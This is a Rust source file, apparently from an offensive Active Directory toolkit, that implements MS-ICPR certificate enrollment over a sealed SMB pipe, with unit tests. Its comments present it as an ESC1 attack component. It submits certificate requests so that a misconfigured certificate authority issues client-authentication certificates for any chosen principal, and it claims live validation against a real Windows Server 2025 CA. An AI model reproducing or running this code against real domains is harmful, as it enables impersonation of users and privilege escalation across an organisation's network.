//! MS-ICPR — ICertPassage remote certificate enrollment (`\PIPE\cert`). `CertServerRequest`
//! submits a PKCS#10 CSR with a `CertificateTemplate:<name>` attribute; on an ESC1 template the
//! CA honors the CSR's SAN and issues a client-auth cert for the requested principal. Requires a
//! sealed RPC bind (the CA rejects plaintext).
//!
//! LIVE-VALIDATED vs Server 2025 AD CS: `CertServerRequest` over the sealed `\cert` pipe issues
//! a real certificate (the built-in `User` template issued a `CN=recon` cert signed by the
//! `corp-CA`). The stub layout matches impacket's `CertServerRequest.getData()` byte-for-byte
//! (every pointee inline after its referent), and large responses are drained across multiple
//! sealed pipe fragments. ESC1 impersonation additionally needs an enrollee-supplies-subject
//! template published on the CA.

use crate::ndr::{NdrDecoder, NdrEncoder};
use crate::transport::SmbPipe;
use crate::{Result, RpcError, Syntax};
use adhammer_smb::SmbClient;

/// ICertPassage interface (v0.0).
pub fn icpr_syntax() -> Syntax {
    Syntax::new("91ae6020-9e3c-11cf-8d7c-00aa00c091be", 0, 0)
}

const CERT_SERVER_REQUEST: u16 = 0;

/// The outcome of an enrollment: disposition (3 = ISSUED) plus the issued cert DER (if any).
pub struct EnrollResult {
    pub disposition: u32,
    pub cert_der: Vec<u8>,
    pub message: String,
}

/// UTF-16LE bytes of `s` with a trailing NUL — the CERTTRANSBLOB string form used for attributes.
fn utf16z(s: &str) -> Vec<u8> {
    let mut v: Vec<u8> = s.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
    v.extend_from_slice(&[0, 0]);
    v
}

/// Marshal CertServerRequest [in] params. `pwszAuthority` is a top-level unique string (referent
/// + inline WSTR); each CERTTRANSBLOB is a [ref] struct {cb, [unique] pb} with the byte array
/// deferred after both fixed parts.
fn encode_request(authority: &str, attribs: &[u8], request: &[u8]) -> Vec<u8> {
    // Layout mirrors impacket's NDRCALL byte-for-byte: each pointer's pointee is marshaled
    // INLINE right after its referent (not deferred), in field order.
    let mut e = NdrEncoder::new();
    e.u32(0); // dwFlags
    e.referent(); // pwszAuthority referent
    e.conformant_varying_wstr(authority); // inline LPWSTR pointee
    e.align(4);
    e.u32(0); // pdwRequestId (DWORD in-value)
              // pctbAttribs CERTTRANSBLOB: cb, pb referent, inline conformant byte array.
    e.u32(attribs.len() as u32);
    e.referent();
    e.u32(attribs.len() as u32); // array max_count
    e.bytes(attribs);
    e.align(4);
    // pctbRequest CERTTRANSBLOB.
    e.u32(request.len() as u32);
    e.referent();
    e.u32(request.len() as u32);
    e.bytes(request);
    e.align(4);
    e.into_bytes()
}

/// Read one out CERTTRANSBLOB: cb, pb referent, and (inline) the conformant byte array.
fn read_blob(d: &mut NdrDecoder) -> Result<Vec<u8>> {
    let cb = d.u32()? as usize;
    let ptr = d.u32()?;
    if ptr == 0 || cb == 0 {
        return Ok(Vec::new());
    }
    let _max = d.u32()?;
    let v = d.read_bytes(cb)?.to_vec();
    d.align(4);
    Ok(v)
}

/// Submit a PKCS#10 CSR to `authority` under `template` over a sealed ICPR channel.
pub async fn request_cert(
    client: &mut SmbClient,
    authority: &str,
    template: &str,
    csr_der: &[u8],
    domain: &str,
    user: &str,
    password: &str,
    host: &str,
) -> Result<EnrollResult> {
    let file_id = client
        .open_pipe("cert")
        .await
        .map_err(|e| RpcError::Protocol(format!("open \\cert: {e}")))?;
    let mut pipe = SmbPipe::new(client, file_id);
    pipe.bind_sealed(icpr_syntax(), domain, user, password, host)
        .await?;

    let attribs = utf16z(&format!("CertificateTemplate:{template}"));
    let stub = encode_request(authority, &attribs, csr_der);
    let resp = pipe.call_sealed(CERT_SERVER_REQUEST, &stub).await?;

    // [out] pdwRequestId, pdwDisposition, then certChain / encodedCert / dispositionMessage
    // CERTTRANSBLOBs, then the DWORD return.
    let mut d = NdrDecoder::new(&resp);
    let _request_id = d.u32()?;
    let disposition = d.u32()?;
    let _chain = read_blob(&mut d)?; // pctbCertChain
    let cert_der = read_blob(&mut d)?; // pctbEncodedCert
    let msg_raw = read_blob(&mut d)?; // pctbDispositionMessage
    let message = String::from_utf16_lossy(
        &msg_raw
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect::<Vec<_>>(),
    )
    .trim_end_matches('\0')
    .to_string();

    Ok(EnrollResult {
        disposition,
        cert_der,
        message,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn request_stub_matches_impacket_layout() {
        // Byte-length + key fields verified against impacket's CertServerRequest.getData()
        // for the same inputs (10-char authority, 58-byte attribs, 20-byte request → 152).
        let s = encode_request(
            "corp-CA-01",
            &utf16z("CertificateTemplate:VulnUser"),
            &(0..20).collect::<Vec<u8>>(),
        );
        assert_eq!(s.len(), 152, "stub length must match impacket");
        assert_eq!(u32::from_le_bytes(s[0..4].try_into().unwrap()), 0); // dwFlags
        assert_ne!(u32::from_le_bytes(s[4..8].try_into().unwrap()), 0); // authority referent
        assert_eq!(u32::from_le_bytes(s[8..12].try_into().unwrap()), 11); // authority max_count = 11
        assert_eq!(u32::from_le_bytes(s[48..52].try_into().unwrap()), 58); // pctbAttribs.cb
    }

    #[test]
    fn utf16z_has_terminator() {
        let v = utf16z("A");
        assert_eq!(v, vec![0x41, 0x00, 0x00, 0x00]);
    }
}
